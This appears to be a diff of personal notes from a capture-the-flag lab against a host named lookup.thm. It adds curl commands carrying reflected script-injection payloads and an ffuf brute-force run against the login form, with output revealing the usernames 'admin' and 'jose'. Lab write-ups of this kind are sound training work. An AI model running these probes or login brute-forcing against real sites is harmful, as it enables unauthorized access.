@@ -1,4 +1,4 @@
-# 10.10.96.71
+# 10.10.230.8
 
 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -51,7 +51,12 @@ A HTML injection vulnerability has been reported in the '/cgi-bin/redir.exe' sam
 
 http://localhost/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E
 
+curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3C
+SCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E"
+
 http://localhost/cgi-bin/redir.exe?URL=http://www.yahoo.com/
+
+curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http://www.yahoo.com/"
 
 <SCRIPT>alert(document.URL)</SCRIPT>
 
@@ -64,3 +69,45 @@ Cross site scripting vulnerabilities have been reported in multiple sample scrip
 This type of vulnerability may be used to steal cookies or perform other web-based attacks.
 
 http://localhost/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x
+curl -L "http://lookup.thm/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x"
+
+# ffuf
+
+ffuf -w xato-net-10-million-passwords-10000.txt -X POST -u http://lookup.thm/login.php -d 'userna
+me=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fs 74
+
+- fw 10 : 응답 본문의 단어 수가 10이면 핕터링
+- fs 74 : 응답 사이즈가 74는 필터링
+
+┌──(root㉿codespaces-d5df79)-[/usr/share/seclists/Passwords/Common-Credentials]
+└─# ffuf -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=a' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-100000.txt -fs 74 -o /ffuf-passwd.txt
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+
+---
+
+:: Method : POST
+:: URL : http://lookup.thm/login.php
+:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
+:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+:: Data : username=FUZZ&password=a
+:: Output file : /ffuf-passwd.txt
+:: File format : json
+:: Follow redirects : false
+:: Calibration : false
+:: Timeout : 10
+:: Threads : 40
+:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+:: Filter : Response size: 74
+
+---
+
+admin [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
+jose [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 194ms]
